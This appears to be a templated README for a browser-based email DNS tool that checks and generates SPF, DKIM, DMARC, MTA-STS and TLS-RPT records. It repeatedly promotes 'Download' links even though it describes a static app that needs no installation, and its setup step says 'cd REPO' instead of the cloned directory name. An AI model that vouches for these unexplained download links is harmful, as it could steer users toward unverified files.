# Email Tools - Email DNS Tools 2026

> **Email Tools provides browser-based tools for creating and validating SPF, DKIM, DMARC, MTA-STS, and TLS-RPT records. It performs standards-based checks without requiring a backend.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/parkergabecjll3084/email-tools-tls-dns?style=flat-square)](https://github.com/parkergabecjll3084/email-tools-tls-dns)

---

<p align="center">
  <a href="https://parkergabecjll3084.github.io/email-tools-tls-dns/">
    <img src="https://img.shields.io/badge/Download-Email%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Email Tools">
  </a>
</p>

> **[Download Email Tools](https://parkergabecjll3084.github.io/email-tools-tls-dns/)**

---

[Download Latest Build](https://parkergabecjll3084.github.io/email-tools-tls-dns/)

---

## What Email Tools Does

Email Tools combines several browser utilities for managing the DNS records and email headers involved in message delivery. The web interface includes record creation, record validation, DNS troubleshooting, and tools for parsing received message headers.

It is built for email administrators, developers, and operations teams that need to review domain configuration or produce records aligned with current standards. The application executes entirely in the browser, performs live lookups through DNS-over-HTTPS, and does not depend on a backend or external runtime.

---

## Capabilities

- Validate SPF, DKIM, DMARC, MTA-STS, and TLS-RPT records.
- Create records for widely used email authentication and transport policies.
- Start email DNS diagnostics with a single action.
- Inspect routing details and other metadata by parsing email headers.
- Query DNS in real time through DNS-over-HTTPS from the browser.
- Check results against applicable IETF RFC specifications.
- Run as a static web application with no dependencies.
- Host the application on a web server, GitHub Pages, or object storage.

---

## Getting Started

First, download the source and enter the project directory:

```bash
git clone https://github.com/parkergabecjll3084/email-tools-tls-dns.git
cd REPO
```

Email Tools is a static browser application, so the files can be opened directly or provided through a local HTTP server:

```bash
python3 -m http.server 8080
```

Visit [http://localhost:8080](http://localhost:8080) in a modern browser.

To make the tool available online, upload the repository contents to a static web server, GitHub Pages, or a compatible object storage service.

---

## Using the Toolkit

1. Launch Email Tools in a web browser.
2. Choose the SPF, DKIM, DMARC, MTA-STS, or TLS-RPT checker or generator.
3. Supply the domain and any additional values requested for the selected record type.
4. Start the check or create the requested record.
5. Compare the resulting validation information with the relevant email DNS requirements.
6. Open the header parser to review fields from a delivered email when needed.

Live diagnostics depend on DNS-over-HTTPS requests, so the browser must have network access during a lookup.

---

## Deployment and Configuration

No backend, service account, or package installation is needed. The application configuration is contained in the static web interface.

For deployment, serve the project files from the static host of your choice and make the site reachable through a web URL. The browser and hosting environment must allow DNS-over-HTTPS requests for live DNS checks to function.

---

## Requirements

- A modern browser with JavaScript enabled.
- Network connectivity for live DNS-over-HTTPS lookups.
- No server runtime or package manager.
- No database or persistent application storage.
- Any suitable static hosting environment.

---

## Frequently Asked Questions

### Who can use Email Tools?

Email Tools is aimed at administrators, developers, and troubleshooting teams responsible for email domains, DNS records, transport policies, or message headers.

### Is a backend required?

No. The application runs in the browser and has no backend or runtime dependencies.

### What method does it use to validate DNS records?

The browser sends live DNS-over-HTTPS queries, and the returned data is evaluated according to rules based on the applicable IETF RFCs.

### Can the application be self-hosted?

Yes. You can run it with a local web server or publish it through a static host, GitHub Pages, or object storage.

### Does Email Tools save settings or results?

The tool is intended to process information in the browser and does not collect or store application data. Local browser settings and the hosting environment may still affect behavior.

### What can I do when a diagnostic fails?

Check the domain spelling, confirm that JavaScript is enabled, verify network connectivity, and ensure the hosting environment allows DNS-over-HTTPS requests. It may also help to confirm the relevant records directly with your DNS provider.

### How do updates reach users?

New versions are distributed through the project repository and its static deployment. When available, use the newest repository build or hosted version.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
